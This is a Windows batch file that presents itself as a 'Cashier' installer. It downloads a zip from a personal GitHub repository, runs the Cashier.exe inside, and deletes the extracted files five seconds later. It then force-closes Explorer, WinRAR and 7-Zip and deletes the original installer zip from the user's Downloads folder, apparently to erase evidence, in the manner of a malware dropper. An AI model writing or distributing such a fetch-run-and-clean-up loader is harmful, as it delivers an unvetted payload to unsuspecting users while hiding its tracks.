@echo off
title Cashier Installer
color 0A

set "ZIP=%TEMP%\Cashier.zip"
set "FOLDER=%TEMP%\CashierInstall"

echo Downloading Cashier...

powershell -Command ^
"Invoke-WebRequest 'https://github.com/zadelrahmanzad-boop/EH/raw/refs/heads/main/Cashier.zip' -OutFile '%ZIP%'"

if not exist "%ZIP%" (
    echo Download failed
    pause
    exit
)

echo Extracting files...

powershell -Command ^
"Expand-Archive -Path '%ZIP%' -DestinationPath '%FOLDER%' -Force"

echo Cleaning ZIP (TEMP)...
del "%ZIP%" /f /q

echo Starting Cashier...
start "" "%FOLDER%\Cashier.exe"

timeout /t 5 >nul

echo Cleaning temp files...
rd /s /q "%FOLDER%"

echo Closing apps that may lock ZIP...

taskkill /f /im explorer.exe >nul 2>&1
taskkill /f /im WinRAR.exe >nul 2>&1
taskkill /f /im 7zFM.exe >nul 2>&1

timeout /t 2 >nul

echo Deleting ZIP from Downloads...
del "%USERPROFILE%\Downloads\Install_Cashier*.zip" /f /q

echo Deleting ZIP from TEMP if exists...
del "%TEMP%\Cashier*.zip" /f /q

start explorer.exe

exit